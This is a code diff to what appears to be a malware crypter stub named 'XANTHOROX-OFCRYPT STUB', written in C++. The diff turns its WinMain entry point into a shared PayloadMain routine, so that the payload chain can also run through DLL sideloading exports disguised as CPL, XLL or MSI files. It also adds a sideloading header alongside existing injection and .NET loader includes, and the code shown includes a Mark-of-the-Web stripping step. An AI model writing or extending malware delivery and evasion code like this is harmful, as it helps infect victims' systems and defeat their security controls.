@@ -42,6 +42,7 @@
 #include "ThreadNormalizer.h"
 #include "Injection.h"
 #include "DotNetLoader.h"
+#include "Sideload.h"
 
 // ═══════════════════════════════════════════════════════════════
 //  XANTHOROX-OFCRYPT STUB | CONFIGURATION BLOCK
@@ -191,9 +192,10 @@ __declspec(allocate(".xthrx")) ResearchBlock ResearchData = {
 
 
 // ═══════════════════════════════════════════════════════════════
-//  MAIN ENTRY — No UAC manifest, runs as standard user
+//  PAYLOAD MAIN — Shared execution chain for EXE and DLL builds
+//  Called by WinMain (EXE) and sideload exports (CPL/XLL/MSI DLL)
 // ═══════════════════════════════════════════════════════════════
-int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
+int PayloadMain(void* hInstance)
 {
     // ── Step -2: MOTW Strip (L21) ──
     if (GlobalConfig.bMotwStrip) {
@@ -467,4 +469,13 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
     VehDispatcher::Cleanup();
 
     return 0;
+}
+
+// ═══════════════════════════════════════════════════════════════
+//  WINMAIN — EXE entry point, delegates to PayloadMain
+// ═══════════════════════════════════════════════════════════════
+int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
+{
+    (void)hPrevInstance; (void)lpCmdLine; (void)nCmdShow;
+    return PayloadMain(hInstance);
 }
